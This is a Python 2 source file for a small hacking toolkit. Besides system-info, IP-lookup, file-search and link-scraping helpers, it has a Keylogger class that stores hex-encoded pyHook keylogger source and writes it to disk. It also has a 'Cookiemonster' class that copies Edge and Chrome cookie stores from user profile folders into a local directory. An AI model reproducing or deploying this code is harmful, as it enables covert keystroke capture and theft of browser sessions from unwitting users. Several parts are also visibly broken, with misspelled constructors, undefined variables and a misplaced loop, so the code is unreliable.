import os
import re
import requests
from platform import *
from tqdm import tqdm
from shutil import copy
from argparse import *
from bs4 import BeautifulSoup


class ArgParser(ArgumentParser):
    # Program Usage. Returns arguments being passed
    pass

    def add_option(self, option1, option2, descr=''):
        self.add_argument(option1, option2, help=descr)

    def parse(self):
        return self.parse_args()


class Seeker(object):
        # loops  files given path and matches a particular string.
        def __init_(self, filename_arg, path_arg):
            self.filename = filename_arg.lower()
            self.path = path_arg

        def search_file():
            for path, directories, files in walk(self.path):
                for file in files:
                    if self.filename in file.lower():
                        print path.join(path, file)


class System(object):
    # Attempts To Find System Hardware, Hostname and Operating System.
    def __init__(self):
        self.platform = platform()
        self.architecture = architecture()[0]
        self.hostname = node()
        self.processor = processor()

    def get(self):
        # Output The Result
        print '[+]Host Information'
        print '-' * 60
        print '[+]Platform:', self.platform
        print '[+]Architecture:', self.architecture
        print '[+]Hostname:', self.hostname
        print '[+]Processor:', self.processor
        print '-' * 60


class Ip(object):
    # Fetches Website Content, and grabs the ip
    def __init__(self):
        self.url = 'http://checkip.dyndns.org'

    def get_ipv4(self):
        request = requests.get(self.url)
        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)


class Keylogger(object):
    # Generates a keylogger script
    def __init__(self):
        self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d\x0a"
        self.code += "\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68\x6f\x6e"
        self.code += "\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x6c"
        self.code += "\x6f\x67\x67\x69\x6e\x67\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72"
        self.code += "\x74\x20\x6f\x73\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d"
        self.code += "\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65\x79\x6c\x6f\x67\x67\x65"
        self.code += "\x72\x3a\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x5f"
        self.code += "\x5f\x69\x6e\x69\x74\x5f\x5f\x28\x73\x65\x6c\x66\x29\x3a\x0d"
        self.code += "\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66"
        self.code += "\x2e\x74\x65\x78\x74\x6c\x6f\x67\x20\x3d\x20\x6f\x73\x2e\x67"
        self.code += "\x65\x74\x63\x77\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20"
        self.code += "\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68\x6f\x6f"
        self.code += "\x6b\x20\x3d\x20\x70\x79\x48\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b"
        self.code += "\x4d\x61\x6e\x61\x67\x65\x72\x28\x29\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68"
        self.code += "\x6f\x6f\x6b\x2e\x4b\x65\x79\x44\x6f\x77\x6e\x20\x3d\x20\x73"
        self.code += "\x65\x6c\x66\x2e\x67\x65\x74\x6b\x65\x79\x73\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65"
        self.code += "\x68\x68\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b\x4b\x65\x79\x62\x6f"
        self.code += "\x61\x72\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20"
        self.code += "\x20\x20\x70\x79\x74\x68\x6f\x6e\x63\x6f\x6d\x2e\x50\x75\x6d"
        self.code += "\x70\x4d\x65\x73\x73\x61\x67\x65\x73\x28\x29\x0d\x0a\x0d\x0a"
        self.code += "\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x67\x65\x74"
        self.code += "\x6b\x65\x79\x73\x28\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29"
        self.code += "\x3a\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6c\x6f"
        self.code += "\x67\x67\x69\x6e\x67\x2e\x62\x61\x73\x69\x63\x43\x6f\x6e\x66"
        self.code += "\x69\x67\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x73\x65\x6c"
        self.code += "\x66\x2e\x74\x65\x78\x74\x6c\x6f\x67\x2c\x20\x6c\x65\x76\x65"
        self.code += "\x6c\x3d\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x44\x45\x42\x55\x47"
        self.code += "\x2c\x20\x66\x6f\x72\x6d\x61\x74\x3d\x27\x25\x28\x6d\x65\x73"
        self.code += "\x73\x61\x67\x65\x29\x73\x27\x29\x0d\x0a\x0d\x0a\x20\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73"
        self.code += "\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20"
        self.code += "\x20\x20\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x6c\x6f\x67\x28\x31"
        self.code += "\x30\x2c\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73\x63\x69"
        self.code += "\x69\x29\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
        self.code += "\x70\x72\x69\x6e\x74\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41"
        self.code += "\x73\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20"
        self.code += "\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0d"
        self.code += "\x0a\x0d\x0a\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20"
        self.code += "\x4b\x65\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"

    def save(self):
        with open('keylogger.py', 'w') as source:
            source.write(self.code)
            source.close()


class Scrape(object):
    # Fecthes a Specific page and finds links
    def __init__(self, scrape_all_links_arg):
        self.page = requests.get('http://{}/'.format(scrape_all_links_arg))
        self.content = self.page.content
        self.href_parser = BeautifulSoup(self.content)

    def scrape_all_links(self):
        for link in tqdm(parser.findAll('a')):
            print link.get('href')


class Cookiemonster(object):
    # Fetches locally stored cookies
    def __init__(self):
        self.user = os.environ.get('USERNAME')
        self.cookiejar = os.path.join(os.getcwd(), 'cookiejar')
        self.cookie_paths = ['C:\users\{}\AppData\Local\MicrosoftEdge\Cookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\INetCookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\Cookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\INetCookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\User\Default\DOMStore'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\INetCookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cookies'.format(current_user),
                                'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\User\Default\DOMStore'.format(current_user),
                                'C:\users\{}\AppData\Local\Google\Chrome\User Data\Default\Cookies'.format(current_user),
                                'C:\Users\{}\AppData\Local\Microsoft\Windows\INetCookies'.format(current_user)]

    def fetch(self):
        if not os.path.exists(self.cookiejar):
            os.mkdir('cookiejar')
        for paths in cookie_paths:
            continue
        for file in tqdm(os.listdir(paths)):
            try:
                copy(os.path.join(paths, file), cookiejar)
            except Exception as e:
                pass
